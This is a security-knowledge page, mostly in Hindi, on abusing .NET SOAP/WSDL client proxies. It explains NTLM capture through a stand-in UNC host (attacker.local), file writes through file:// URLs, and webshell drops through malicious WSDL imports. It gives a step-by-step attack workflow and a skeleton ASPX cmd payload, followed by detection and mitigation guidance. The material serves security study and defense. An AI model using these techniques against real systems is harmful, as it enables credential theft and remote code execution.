# .NET SOAP/WSDL Client Proxy Abuse

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

- `SoapHttpClientProtocol`, `DiscoveryClientProtocol` और उनके साथ वाले क्लास `HttpWebClientProtocol` से इनहेरिट करते हैं, जिसका `GetWebRequest()` बिना `HttpWebRequest` लागू किए `WebRequest.Create()` द्वारा बनाए गए scheme-agnostic `WebRequest` ऑब्जेक्ट को लौटाता है।
- अगर attacker `Url` के ऊपर नियंत्रण रखता है, तो framework शांतिपूर्वक `FileWebRequest`, `FtpWebRequest` या UNC/SMB हैंडलर स्वैप कर सकता है, जिससे "HTTP" proxies NTLM leak gadgets या arbitrary file writers बन जाते हैं।
- कोई भी फीचर जो attacker-प्रदान किया गया WSDL `ServiceDescriptionImporter` के साथ इम्पोर्ट करता है उस बग को बढ़ा देता है: WSDL generated proxy constructor, SOAP methods, complex types और namespaces को नियंत्रित करता है, जिससे Barracuda Service Center RMM, Ivanti EPM, Umbraco 8, PowerShell और SSIS जैसे प्रोडक्ट्स में pre-auth RCE (webshells, script drops) संभव हो जाता है।

## Root cause: HttpWebClientProtocol is scheme-agnostic

`WebClientProtocol.GetWebRequest()` में `var req = WebRequest.Create(uri)` होता है और इसे बिना बदले लौटाया जाता है। `HttpWebClientProtocol.GetWebRequest()` HTTP-only फील्ड सेट करने के लिए `req as HttpWebRequest` का प्रयास करता है, लेकिन जब cast फेल होती है तो भी यह मूल `req` को ही लौटाता है। इसलिए runtime उस scheme का पालन करता है जो `Url` में मौजूद है:

- `http(s)://` → `HttpWebRequest`
- `file:///` या `\\host\share\` → `FileWebRequest`
- `ftp://` → `FtpWebRequest`

`SoapHttpClientProtocol.Invoke()` फिर SOAP POST बॉडी को चुने हुए किसी भी transport handler के माध्यम से stream कर देता है, भले ही उसका मतलब डिस्क पर लिखना या SMB के ऊपर ट्रांसफर करना ही क्यों न हो।

## Primitive 1 – NTLM capture / relay via UNC targets

1. `SoapHttpClientProtocol.Url` पर कंट्रोल हासिल करें (direct setter, config value, database row, आदि)।
2. इसे किसी UNC path जैसे `file://attacker.local/sink/payload` की तरफ पॉइंट करें।
3. CLR उस path को SMB के जरिए खोलता है और integrated authentication करता है, जिससे attacker को NTLM challenge/response leak होता है।
4. कैप्चर किए गए hashes का उपयोग offline cracking या NTLM relay (SMB/HTTP) के लिए किया जा सकता है अगर signing/EPA अनुपस्थित हों।

यह किसी भी .NET SOAP/HTTP proxy path पर लागू होता है जो user input स्वीकार करता है, भले ही आगे और exploit संभव न हो।

## Primitive 2 – Arbitrary file writes via `file://`

1. कॉल से पहले `Url = "file:///inetpub/wwwroot/poc.aspx"` (या कोई भी writable path) सेट करें।
2. कोई भी SOAP method invoke करें; framework पूरे SOAP envelope को चुने हुए path पर लिख देता है, मौजूदा फाइलों को overwrite करते हुए।
3. User-controlled arguments XML elements के अंदर दिखते हैं, जिससे attackers CSHTML/ASPX payloads डाल सकते हैं या config फाइलें poison कर सकते हैं।

Limitations:

- Content हमेशा XML होता है; scalar fields entity-encoded होते हैं, इसलिए साधारण strings से `<script>` inject करने के लिए अतिरिक्त ट्रिक्स चाहिए होते हैं।
- meaningful payloads के लिए कम से कम एक attacker-प्रभावित argument चाहिए या method signature बदलने की क्षमता (WSDL abuse देखें)।

Runtime अक्सर write के बाद `Client found response content type of 'application/octet-stream', but expected 'text/xml'` throw कर देता है—इस error को एक IOC के रूप में मानें।

## Weaponizing WSDL imports

### Auto-generated proxies via `ServiceDescriptionImporter`

कई प्रोडक्ट "custom web service" सुविधाएँ देते हैं जो एक WSDL URL स्वीकार करते हैं, और फिर:

1. attacker-नियंत्रित WSDL को `ServiceDescription.Read()` करते हैं।
2. `ServiceDescriptionImporter` C# proxy classes generate करता है जो `SoapHttpClientProtocol` को extend करते हैं।
3. CodeDOM proxy को compile करता है और reflection से requested method को कॉल किया जाता है।

Attacker पूर्ण रूप से नियंत्रित कर सकता है:

- `soap:address` / `soap12:address` `location` → यह `base.Url` बन जाता है (इसे `file://` या UNC paths पर सेट किया जा सकता है)।
- Method names, parameter lists, complex types और serializers।
- Namespace URIs जो हर SOAP message में `xmlns:*` attributes के रूप में आ जाते हैं।

कोई scheme validation नहीं होती, इसलिए हर generated proxy मूल design flaw को inherit करता है।

### Shaping the SOAP envelope for RCE

- Complex type serialization: WSDL में custom structs परिभाषित करें ताकि जब `XmlSerializer` उन्हें फिर से emit करे तो वे attacker-निर्धारित element names/attributes उत्पन्न करें। ASPX webshell drops के लिए ऐसे types बनायें जो serialize होकर देते हैं:
```xml
<script runat="server">
// payload pulling `Request.QueryString["cmd"]`
</script>
```
और `Url` को `file:///.../webroot/shell.aspx` पर पॉइंट करके RCE प्राप्त करें।
- Namespace injection: भले ही arguments hard-coded हों (उदा., Umbraco Forms), WSDL में declare किए गए namespaces (उदा., `xmlns:tns="http://host/service?x=@{...}"`) को SOAP envelope में verbatim कॉपी किया जाता है। namespace query string के अंदर payload encode करके CSHTML Razor या PowerShell script drops बिना parameter control के भी कर सकते हैं।

इन तकनीकों ने Barracuda Service Center RMM (CVE-2025-34392) exploit को पॉवर दिया: एक unauthenticated SOAP कॉल ने malicious WSDL सप्लाई किया, `soap12:address` को `file:///Program Files/.../SCMessaging/poc.aspx` पर सेट किया, complex parameters के माध्यम से `<script runat="server">` inject किया, और एक webshell upload किया जिसने arbitrary `cmd.exe` commands execute किए।

## Typical attack workflow

1. ऐसी functionality पहचानें जो WSDL URL स्वीकार करती हो या उपयोगकर्ताओं को SOAP endpoints configure करने देती हो (उदा., Barracuda `InvokeRemoteMethod`, Ivanti EPM connectors, Umbraco 8 Forms datasources, PowerShell `New-WebServiceProxy`)।
2. एक malicious WSDL host करें जिसका `soap:address` writable path या UNC share की ओर पॉइंट करे और जिसका schema definitions payload-friendly methods/types प्रदान करें।
3. import/compilation ट्रिगर करें। टार्गेट attacker-नियंत्रित constructor और methods के साथ एक proxy DLL emit करता है।
4. जब application generated method को invoke करता है, तो SOAP request serialize होकर attacker-निर्दिष्ट path पर लिखा जाता है और payload embed हो जाता है।
5. dropped file execute करें (browse to `poc.aspx?cmd=whoami`, CSHTML लोड करें, या PowerShell script चलाएं) या captured NTLM material को replay करें।

## Detection & hunting

- Static analysis: `ServiceDescriptionImporter`, `SoapHttpClientProtocol`, `HttpWebClientProtocol`, या `New-WebServiceProxy` के लिए grep करें। देखें कि `Url` या WSDL inputs कहाँ से आते हैं—कोई भी user-controlled स्रोत रेड फ्लैग है।
- Runtime telemetry:
- proxy creation को instrument करें और schemes लॉग करें; `file`, `ftp`, या UNC values पर alert करें।
- SOAP calls के बाद विशेष "Client found response content type of 'application/octet-stream'" errors के लिए मॉनिटर करें।
- application directories के अंदर unexpected `.aspx/.cshtml/.ps1` writes के लिए देखो जो web service identity द्वारा किए गए हों।
- Network/file signals: web servers द्वारा attacker infrastructure की ओर initiated SMB connections, या temporary proxy DLLs का अचानक compile होना अक्सर exploitation से पहले होता है।

## Mitigations

- Invoke करने से पहले किसी भी `HttpWebClientProtocol`-derived proxy पर transport validation लागू करें:
```csharp
var uri = new Uri(proxy.Url);
if (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps)
throw new InvalidOperationException("SOAP clients must stay on HTTP/S");
```
- Imported WSDL sanitize करें: Proxy downloads को ऐसे broker के माध्यम से कराएँ जो `soap:address` entries को rewrite या reject करे जो HTTP/S नहीं हैं, unknown bindings को drop करे, और namespace payload tricks को forbid करे।
- Untrusted WSDL फीचर्स को disable करें: "upload a WSDL" सुविधाओं की जगह vetted, server-side templates या allowlists का उपयोग करें।
- Segregate write locations: सुनिश्चित करें कि app pools executable directories में लिख न सकें; data vs. code के लिए अलग volumes का प्रयोग करें ताकि file-write primitives RCE न बन सकें।
- NTLM exposure को harden करें: जहाँ संभव हो outbound SMB disable करें; अन्यथा SMB signing, EPA और अन्य relay mitigations लागू करें।

## References

- [watchTowr Labs – SOAPwn: Pwning .NET Framework Applications Through HTTP Client Proxies and WSDL](https://labs.watchtowr.com/soapwn-pwning-net-framework-applications-through-http-client-proxies-and-wsdl/)

{{#include ../../banners/hacktricks-training.md}}
